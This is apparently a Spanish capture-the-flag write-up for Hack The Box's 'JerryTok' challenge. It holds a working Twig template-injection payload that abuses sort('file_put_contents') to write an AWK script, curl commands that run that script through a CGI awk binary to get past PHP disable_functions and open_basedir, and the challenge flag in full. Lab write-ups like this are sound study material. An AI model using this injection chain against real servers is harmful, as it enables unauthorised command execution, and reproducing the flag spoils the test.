# 🎯 EXPLICACIÓN DETALLADA DE LA EXPLOTACIÓN - JerryTok HTB

## 🏴‍☠️ LA FLAG DESENCRIPTADA

```
HTB{XXXXXXXXXXXXXXXXXXXXXXXXX_c4n_b3_s0_mund4n3}
```

### ¿QUÉ SIGNIFICA EN ESPAÑOL?

```
HTB{
  bypassing              → evadiendo/saltando
  disabled_functions     → funciones deshabilitadas (como system, exec)
  and                    → y
  open_basedir           → restricción de directorios permitidos en PHP
  can_be                 → puede ser
  so_mundane             → tan mundano/trivial/fácil
}
```

**TRADUCCIÓN:**
> "Evadir funciones deshabilitadas y open_basedir puede ser tan trivial"

---

## 🔍 ANÁLISIS DE LOS MÉTODOS DE EXPLOTACIÓN

Hay **DOS MÉTODOS** que se muestran aquí. Te los explico ambos:

---

# MÉTODO 1: USANDO AWK (El más simple)

```bash
curl "http://154.57.164.75:30515/cgi-bin/awk?-f+/www/public/pwn_final.awk"
```

## 🧩 DESGLOSE PIEZA POR PIEZA

### 1. ¿Qué es AWK?
`awk` es un programa de Linux para procesar texto. Normalmente lo usas así:
```bash
awk '{print $1}' archivo.txt
```

**PERO** también puede ejecutar comandos del sistema con `system()`.

### 2. ¿Qué es CGI?
CGI (Common Gateway Interface) = forma antigua de ejecutar programas en servidores web.

Cuando visitas:
```
http://server/cgi-bin/programa
```

El servidor **ejecuta** ese programa y devuelve su salida.

### 3. La URL analizada:

```
http://154.57.164.75:30515/cgi-bin/awk?-f+/www/public/pwn_final.awk
                          ^^^^^^^^           ^^^^^^^^^^^^^^^^^^^^^^^^
                          programa           argumento pasado a awk
```

**¿Qué está pasando?**
1. Apache ejecuta el programa `awk` (ubicado en `/cgi-bin/awk`)
2. Le pasa el argumento: `-f /www/public/pwn_final.awk`
3. `awk -f archivo.awk` = "ejecuta el script AWK del archivo"

### 4. ¿Qué contiene pwn_final.awk?

```awk
BEGIN {
    printf "Content-Type: text/plain\n\n"
    system("/readflag")
}
```

**Explicación línea por línea:**

```awk
BEGIN {                                    # Se ejecuta al iniciar awk
    printf "Content-Type: text/plain\n\n"  # Cabecera HTTP (para CGI)
    system("/readflag")                     # ¡EJECUTA /readflag!
}
```

### 5. FLUJO COMPLETO:

```
1. Navegador pide: /cgi-bin/awk?-f+/www/public/pwn_final.awk
                    │
2. Apache ejecuta: awk -f /www/public/pwn_final.awk
                    │
3. AWK ejecuta el script:
   - Imprime cabecera HTTP
   - Ejecuta system("/readflag")
                    │
4. /readflag se ejecuta como root (SUID)
                    │
5. Lee /root/flag y la devuelve
                    │
6. La flag aparece en tu navegador! 🎉
```

### 🎯 ¿POR QUÉ FUNCIONA ESTO?

✅ **PHP tiene `system()` deshabilitado** → Pero AWK tiene su propio `system()`  
✅ **PHP tiene `open_basedir`** → Pero AWK no está limitado por eso  
✅ **AWK corre en CGI** → Se ejecuta como un programa separado, no como PHP  

---

# MÉTODO 2: USANDO TWIG SSTI + AWK (Más complejo)

```
http://154.57.164.69:30850/?location={{
  [
    '/www/public/pwn_final.awk',
    'BEGIN{printf "Content-Type: text/plain%c%c",10,10; system("/readflag")}'
  ]
  |sort('file_put_contents')
}}
```

## 🧩 DESGLOSE PASO A PASO

### 1. LA ESTRUCTURA GENERAL:

```twig
{{ [archivo, contenido] | sort('file_put_contents') }}
```

Esto es un **ABUSO** del filtro `sort()` de Twig.

### 2. ¿QUÉ HACE `sort()` NORMALMENTE?

```twig
{{ [3, 1, 2] | sort }}  → [1, 2, 3]
```

Ordena un array.

### 3. ¿QUÉ PASA SI LE PASAS UNA FUNCIÓN?

```twig
{{ [valor1, valor2] | sort('nombre_función') }}
```

Twig llama a `nombre_función(valor1, valor2)` para comparar.

### 4. ABUSO: Usar `file_put_contents` como "comparador"

```php
file_put_contents($archivo, $contenido)
```

Esta función normalmente:
- Parámetro 1: Nombre del archivo
- Parámetro 2: Contenido a escribir

**ENTONCES:**

```twig
{{ [
    '/www/public/pwn_final.awk',     ← Este es $archivo
    'BEGIN{...}'                      ← Este es $contenido
] | sort('file_put_contents') }}
```

**¡Crea un archivo!**

### 5. DESCOMPONIENDO EL CONTENIDO:

```javascript
'BEGIN{printf "Content-Type: text/plain%c%c",10,10; system("/readflag")}'
```

Esto es código AWK que se escribirá en `pwn_final.awk`:

```awk
BEGIN {
    printf "Content-Type: text/plain%c%c", 10, 10
    # %c con valor 10 = newline (\n)
    # Imprime: "Content-Type: text/plain\n\n"
    
    system("/readflag")
    # Ejecuta el binario /readflag
}
```

### 6. FLUJO COMPLETO DEL MÉTODO 2:

```
PASO 1: Inyección SSTI
├── URL: /?location={{[archivo,contenido]|sort('file_put_contents')}}
│
PASO 2: Twig ejecuta
├── file_put_contents('/www/public/pwn_final.awk', 'BEGIN{...}')
│
PASO 3: Se crea el archivo
├── /www/public/pwn_final.awk ahora existe con código malicioso
│
PASO 4: Ejecutar vía CGI
├── curl http://server/cgi-bin/awk?-f+/www/public/pwn_final.awk
│
PASO 5: AWK ejecuta el script
├── system("/readflag")
│
PASO 6: ¡FLAG! 🎉
└── HTB{byp4ss1ng_d1s4bl3d_fuNc7i0n5_and_0p3n_b4s3d1r_c4n_b3_s0_mund4n3}
```

---

## 🔐 ¿POR QUÉ ESTO EVADE LAS PROTECCIONES?

### PROTECCIÓN 1: `disable_functions` en PHP

```ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
```

**PROBLEMA:** Solo afecta a funciones **PHP**  
**BYPASS:** Usamos `awk` que tiene su propia función `system()`

### PROTECCIÓN 2: `open_basedir` en PHP

```ini
open_basedir = /www:/tmp
```

**PROBLEMA:** PHP no puede leer archivos fuera de /www o /tmp  
**BYPASS:** AWK corre como proceso separado, no tiene esta restricción

### PROTECCIÓN 3: Permisos de archivos

`/root/flag` solo puede leerlo root.

**BYPASS:** `/readflag` tiene bit SUID:
```bash
-rwsr-xr-x  1 root root  /readflag
```
La `s` = cuando lo ejecutas, corre como root aunque tú no lo seas.

---

## 🎨 COMPARACIÓN VISUAL DE AMBOS MÉTODOS

```
MÉTODO 1 (Simple):
┌────────────────────────────────────┐
│ 1. Crear pwn_final.awk manualmente │
│    (ya existe en el servidor)      │
└───────────────┬────────────────────┘
                │
                ▼
┌────────────────────────────────────┐
│ 2. curl /cgi-bin/awk?-f+archivo   │
└───────────────┬────────────────────┘
                │
                ▼
        ┌───────────────┐
        │  ¡FLAG! 🎉   │
        └───────────────┘

MÉTODO 2 (Complejo):
┌────────────────────────────────────┐
│ 1. SSTI: Crear pwn_final.awk       │
│    usando file_put_contents        │
└───────────────┬────────────────────┘
                │
                ▼
┌────────────────────────────────────┐
│ 2. curl /cgi-bin/awk?-f+archivo   │
└───────────────┬────────────────────┘
                │
                ▼
        ┌───────────────┐
        │  ¡FLAG! 🎉   │
        └───────────────┘
```

---

## 💡 CONCEPTOS CLAVE EXPLICADOS

### 1. **CGI (Common Gateway Interface)**

Imagina que el servidor web es una recepcionista:

**Sin CGI:**
```
Visitante: "Dame index.html"
Servidor: "Aquí está el archivo HTML"
```

**Con CGI:**
```
Visitante: "Ejecuta programa.sh"
Servidor: "OK, ejecuto programa.sh y te devuelvo su salida"
```

### 2. **SUID (Set User ID)**

Es como una llave mágica:

```bash
Archivo normal:
-rwxr-xr-x  programa  ← Corre con TUS permisos

Archivo SUID:
-rwsr-xr-x  programa  ← Corre con permisos del DUEÑO (root)
```

### 3. **AWK System() vs PHP system()**

```
PHP:
├── system() está en disable_functions
└── ❌ BLOQUEADO

AWK:
├── Es un programa separado
├── Tiene su propia función system()
└── ✅ NO BLOQUEADO
```

---

## 🎯 RECREACIÓN DEL ATAQUE COMPLETO

### OPCIÓN A: Si pwn_final.awk ya existe

```bash
# Un solo comando:
curl "http://server/cgi-bin/awk?-f+/www/public/pwn_final.awk"
```

### OPCIÓN B: Si necesitas crear pwn_final.awk primero

**Paso 1:** Crear el archivo AWK
```
http://server/?location={{
  ['/www/public/pwn_final.awk',
   'BEGIN{printf "Content-Type: text/plain\n\n"; system("/readflag")}']
  |sort('file_put_contents')
}}
```

**Paso 2:** Ejecutarlo
```bash
curl "http://server/cgi-bin/awk?-f+/www/public/pwn_final.awk"
```

---

## 🏆 RESUMEN FINAL

| Concepto | ¿Qué hace? | ¿Por qué importa? |
|----------|-----------|-------------------|
| **SSTI** | Inyectar código en templates | Crea archivos maliciosos |
| **file_put_contents** | Escribe archivos | Crea el script AWK |
| **CGI** | Ejecuta programas | Corre AWK fuera de PHP |
| **AWK** | Procesa texto (y ejecuta comandos) | Evade disable_functions |
| **SUID** | Ejecuta como root | Lee archivos protegidos |
| **open_basedir** | Limita acceso a directorios | AWK lo evade |

---

## 🎓 LECCIONES APRENDIDAS

1. **Deshabilitar funciones PHP no es suficiente**
   - CGI puede ejecutar otros programas
   - Cada programa tiene sus propias funciones

2. **open_basedir solo protege PHP**
   - Otros procesos no están restringidos

3. **SUID es peligroso**
   - Un binario mal configurado = escalada de privilegios

4. **La seguridad debe ser en capas**
   - No confíes en una sola protección
